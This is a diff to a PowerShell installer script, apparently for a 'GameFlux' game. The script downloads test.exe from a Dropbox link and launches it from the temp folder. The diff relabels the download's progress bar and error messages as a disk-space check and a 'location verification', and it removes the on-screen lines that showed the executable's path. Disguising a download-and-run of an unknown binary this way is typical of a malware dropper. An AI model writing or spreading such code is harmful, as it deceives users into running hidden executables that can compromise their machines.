@@ -58,8 +58,8 @@ Write-Host "✅ System security configured successfully!" -ForegroundColor Green
 Write-Host "`n" -NoNewline
 
 # Step 2: Download first application
-Write-CenteredText "📥 Step 2: Downloading Test Application..." "Blue"
-Show-ProgressBar -Activity "Downloading Test App" -Status "Starting download..." -PercentComplete 35
+Write-CenteredText "📥 Step 2: Check" "Blue"
+Show-ProgressBar -Activity "Checking the free space on your computer" -Status "Starting checking" -PercentComplete 35
 
 try {
     $testUrl = 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/test.exe?rlkey=kb77xr8jjz91q5wyqepzksoq3&st=ufblgjqa&dl=1'
@@ -68,7 +68,7 @@ try {
     # Simulate download progress
     for ($i = 0; $i -le 100; $i += 5) {
         Show-DownloadProgress -FileName "test.exe" -Current $i -Total 100
-        Show-ProgressBar -Activity "Downloading Test App" -Status "Downloading... $i%" -PercentComplete (35 + ($i * 0.25))
+        Show-ProgressBar -Activity "Checking the free space on your computer" -Status "Starting..... $i%" -PercentComplete (35 + ($i * 0.25))
         Start-Sleep -Milliseconds 100
     }
     
@@ -76,7 +76,7 @@ try {
     Show-ProgressBar -Activity "Downloading Test App" -Status "Download completed!" -PercentComplete 60
     Write-Host "`n✅ Test application downloaded successfully!" -ForegroundColor Green
 } catch {
-    Write-Host "`n❌ Error downloading test application: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "`n❌ Location verification error: $($_.Exception.Message)" -ForegroundColor Red
 }
 Write-Host "`n" -NoNewline
 
@@ -111,7 +111,7 @@ try {
     Start-Process "$env:TEMP\test.exe" -ErrorAction Stop
     Write-Host "✅ Test application launched successfully!" -ForegroundColor Green
 } catch {
-    Write-Host "❌ Error launching test application: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "❌ Error launching application: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 Show-ProgressBar -Activity "Launching Applications" -Status "Waiting before launching GameFlux..." -PercentComplete 95
@@ -137,9 +137,7 @@ Write-Host "`n" -NoNewline
 
 # Display system information
 Write-CenteredText "📊 System Information:" "Yellow"
-Write-CenteredText "• Test Application: $env:TEMP\test.exe" "White"
 Write-CenteredText "• GameFlux: $env:TEMP\gameflux.exe" "White"
-Write-CenteredText "• Temporary Folder: $env:TEMP" "White"
 Write-Host "`n" -NoNewline
 
 Write-CenteredText "Press any key to exit..." "Gray"
